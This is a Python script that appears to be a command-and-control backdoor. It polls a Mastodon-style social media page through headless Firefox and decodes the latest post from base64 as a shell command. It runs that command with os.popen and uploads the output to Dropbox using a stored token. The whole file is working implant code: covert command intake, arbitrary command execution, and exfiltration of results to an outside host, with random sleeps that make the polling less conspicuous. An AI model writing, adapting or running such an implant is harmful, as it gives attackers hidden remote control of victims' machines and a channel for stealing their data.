import toml
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
import base64
import time
import random
import os
import dropbox

# get username and server from a toml file
def get_credentials():
    # Print status
    print("[*] Getting credentials from config file")

    # Define the url and dropbox_token as a global variable
    global url, dropbox_token

    # Load the config file
    config = toml.load("config.toml")

    # Get the url from the config file
    url = config["url"]

    # Get dropbox token from the config file
    dropbox_token = config["dropbox_token"]

# Prepare the browser
def set_browser(url):
    # Set Firefox options
    options = Options()

    # Set the browser to headless
    options.headless = True

    # Get the page with gecko driver headless
    driver = webdriver.Firefox(options=options)

    # Get the page
    driver.get(url)

    # Wait for the page to load
    time.sleep(1)

    # Return the driver
    return driver

def get_latest_command(driver):
    # Loop until we get a command
    while True:
        try:
            # Refresh the page
            driver.refresh()

            # Wait for the page to load
            time.sleep(1)

            # Get the latest toot
            latest_toot = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div[2]/div[2]/div/div/div/article[1]/div/div/div[1]/div/p").text

            # Decode the toot
            command = base64.b64decode(latest_toot).decode("utf-8")

            # Return the command
            return command
        except:
            # Print status
            print("[*] Couldn't get latest command, trying soon again")

            # Wait for a random amount of time
            time.sleep(random.randint(20, 30))


def execute_command(command):
    # Print status
    print("[*] Executing command...")

    # Execute the command
    output = os.popen(command).read()

    # Print status
    print("[*] Command executed")

    # Return the output
    return output

def upload_output(output):
    # Print status
    print("[*] Uploading output to dropbox...")

    # Upload the output
    dbx = dropbox.Dropbox(dropbox_token)

    # Encode the output
    output = output.encode("utf-8")

    # Set the output file name as the current time in the format ddmmYYYYHHMMSS
    output_file_name = time.strftime("%d%m%Y%H%M%S")

    # Upload the output
    dbx.files_upload(output, "/output/" + output_file_name + ".txt")

    # Print status
    print("[*] Output uploaded")

# Listen for commands
def listen():
    # Get the driver
    driver = set_browser(url)

    # Print status
    print("[*] Getting first command...")

    # Get the first command
    command = get_latest_command(driver)

    # Print status
    print("[*] Listening for commands...")

    # Loop forever to listen for commands
    while True:
        # Get the latest command
        latest_command = get_latest_command(driver)

        # Check if the command is different
        if latest_command != command:
            # Print status
            print("[*] New command received")

            # Execute the command
            output = execute_command(latest_command)

            # Upload the output
            upload_output(output)

            # Set the command to the latest command
            command = latest_command
        
        # Wait for a random amount of time
        time.sleep(random.randint(20, 30))

# Main function
def main():
    # Get the credentials
    get_credentials()

    # Listen for commands
    try:
        listen()
    # on keyboard interrupt
    except KeyboardInterrupt:
        # Print status
        print("[*] Keyboard interrupt detected, exiting...")

# Run the main function
if __name__ == "__main__":
    main()
